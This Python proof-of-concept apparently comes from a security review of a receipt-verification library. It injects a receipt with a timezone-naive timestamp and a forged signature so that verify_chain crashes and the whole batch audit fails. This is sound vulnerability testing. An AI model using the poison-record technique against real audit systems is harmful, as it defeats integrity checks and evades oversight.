#!/usr/bin/env python3
"""poc_alpha_1 — v2.2 batch-crash: ONE receipt with a timezone-naive `created`
kills verify_chain entirely (uncaught TypeError). F6's changelog promises
"a poison receipt yields per-receipt FAIL, never a batch crash".

Root cause: _parse_time() returns NAIVE datetimes for offset-less strings
(e.g. "2026-08-31T08:00:00", date-only "2026-08-31", or any fromisoformat
input without Z/offset). verify_receipt survives (its floor-compare TypeError
lands in the fail-closed umbrella), but verify_chain's temporal-ordering
check `cur < prev_created` runs OUTSIDE any try/except — comparing a naive
datetime to the previous receipt's aware one raises TypeError and the whole
audit dies. No key material needed: the poison record's signature is never
reached; any single injected record (log aggregation, recorder frame) works.

Validated against receipt_lib.py v2.2 (the chain_hash guard added in v2.2
does not cover this path).
"""
import sys, copy, traceback
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, chain_hash, generate_keypair,
                         verify_chain, verify_receipt, sha256_hex)

SVC = {"type": "service", "id": "svc-deploy-bot", "is_service_account": True,
       "auth_method": "mtls"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]
CID = "chain:prod-0001"

sk, pk = generate_keypair()
r1 = build_receipt(action_id="a-001", subject_name="prod:svc", actor=SVC,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk, chain_id=CID)

# Poison record: well-formed except `created` has NO UTC offset.
r2 = build_receipt(action_id="a-002", subject_name="prod:svc", actor=SVC,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash=chain_hash(r1), signing_key=sk, chain_id=CID)
r2["predicate"]["timestamps"]["created"] = "2026-08-31T08:00:00"  # naive (RFC3339 forbids)
r2["signatures"] = [{"keyid": "deadbeef", "sig": "AAAA"}]  # sig need not even be valid

solo = verify_receipt(r2, pk)
print(f"[*] poison receipt standalone verdict (fail-closed works here): {solo.verdict}")
print(f"    reason: {solo.reasons[-1] if solo.reasons else None}")

crashed = False
try:
    out = verify_chain([r1, r2], pk)
    print(f"[*] verify_chain returned: all_links_valid={out['all_links_valid']}")
except Exception:
    crashed = True
    print("[!] verify_chain RAISED — entire batch audit denied by one record:")
    traceback.print_exc(limit=1)

# Variant B: poison FIRST (naive), honest aware receipt SECOND — crash from
# the other comparison direction.
crashed_b = False
r1b = copy.deepcopy(r1); r1b["predicate"]["timestamps"]["created"] = "2026-08-31"
r2h = build_receipt(action_id="a-002b", subject_name="prod:svc", actor=SVC,
                    policy_decision=POL,
                    execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                    evidence_items=EV, prev_chain_hash=chain_hash(r1b), signing_key=sk, chain_id=CID)
try:
    verify_chain([r1b, r2h], pk)
except TypeError:
    crashed_b = True
print(f"[*] variant B (date-only '2026-08-31' first, aware second) also crashes: {crashed_b}")

print("EXPLOIT-WORKS" if (crashed and crashed_b) else "HELD")
